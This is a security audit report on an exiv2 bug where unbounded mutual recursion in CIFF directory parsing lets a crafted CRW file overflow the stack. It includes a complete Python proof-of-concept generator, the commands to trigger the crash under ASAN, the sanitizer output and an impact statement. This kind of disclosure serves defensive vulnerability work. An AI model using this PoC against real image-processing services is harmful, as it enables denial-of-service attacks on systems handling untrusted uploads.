# exiv2 Security Audit Report


## Bug1: Uncontrolled Recursion in CIFF Directory Parsing Causes Stack Overflow

`CiffDirectory::readDirectory()` and `CiffDirectory::doRead()` in `src/crwimage_int.cpp` mutually recurse on every nested directory-type CIFF entry with no depth limit, allowing a crafted CRW file to exhaust the thread stack and crash the process.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented exiv2 binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

D = 50000  # recursion depth; each level adds 16 bytes to the heap
H = 4 + D * 16  # total heap size

heap = bytearray(H)

# Leaf at heap[0..3]: all zeros => o=0, count=0, no entries (base case)

# Build entry tables for each recursion level L (0 = root, D-1 = deepest)
# Each level L occupies the last 16 bytes of its buffer [0 .. H-16*L-1].
# E_L = H - (L+1)*16 is both the heap offset of the entry table and the
# sub-directory size passed to the next recursive call.
for L in range(D):
    E = H - (L + 1) * 16
    struct.pack_into('<H', heap, E + 0,  1)       # count = 1
    struct.pack_into('<H', heap, E + 2,  0x2800)  # tag: directory, valueData
    struct.pack_into('<I', heap, E + 4,  E)        # size_field = E (sub-dir size)
    struct.pack_into('<I', heap, E + 8,  0)        # offset_field = 0 (sub-dir base)
    struct.pack_into('<I', heap, E + 12, E)        # o_field = E (entry table offset)

# CRW / CIFF file header (26 bytes)
HEAP_OFFSET = 26
header = bytearray()
header += b'II'                             # little-endian marker
header += struct.pack('<I', HEAP_OFFSET)    # offset to heap
header += b'HEAPCCDR'                       # CIFF signature
header += struct.pack('<H', 1)              # major version
header += struct.pack('<H', 2)              # minor version
header += b'\x00' * 8                       # padding

assert len(header) == HEAP_OFFSET

with open('poc_input.crw', 'wb') as f:
    f.write(header)
    f.write(heap)

print(f"[+] Written: poc_input.crw ({len(header) + len(heap)} bytes)")
print(f"[*] Trigger: exiv2 pr poc_input.crw")
print(f"[*] Expected: stack-overflow at recursion depth ~{D}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/exiv2 pr poc_input.crw || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: stack-overflow on address 0x7ffec03d7ff8 (pc 0x7f4e6127d6c8 bp 0x000000000001 sp 0x7ffec03d8000 T0)
    #4 in Exiv2::Internal::CiffDirectory::readDirectory(unsigned char const*, unsigned long, Exiv2::ByteOrder) (libexiv2.so.30+0x3836b52)
    #5 in Exiv2::Internal::CiffDirectory::doRead(unsigned char const*, unsigned long, unsigned int, Exiv2::ByteOrder) (libexiv2.so.30+0x38387d0)
SUMMARY: AddressSanitizer: stack-overflow in __asan::GetCurrentThread()

### Impact

An attacker can supply a specially crafted CRW image file that causes `exiv2` to recurse tens of thousands of levels deep through `CiffDirectory::readDirectory` and `CiffDirectory::doRead`, exhausting the default 8 MB thread stack and triggering an unconditional denial of service via process crash (SIGSEGV). The attack surface is any code path that calls `exiv2 pr` or invokes `CrwImage::readMetadata()` on attacker-controlled input, including web services that process user-uploaded images. In environments lacking stack canaries or other mitigations the stack overflow may additionally serve as a code-execution primitive.

<!-- REPORT_SOURCE: include_exiv2_crwimage_hpp#001 -->
<!-- DEDUP: CiffDirectory::readDirectory::CWE-674 -->
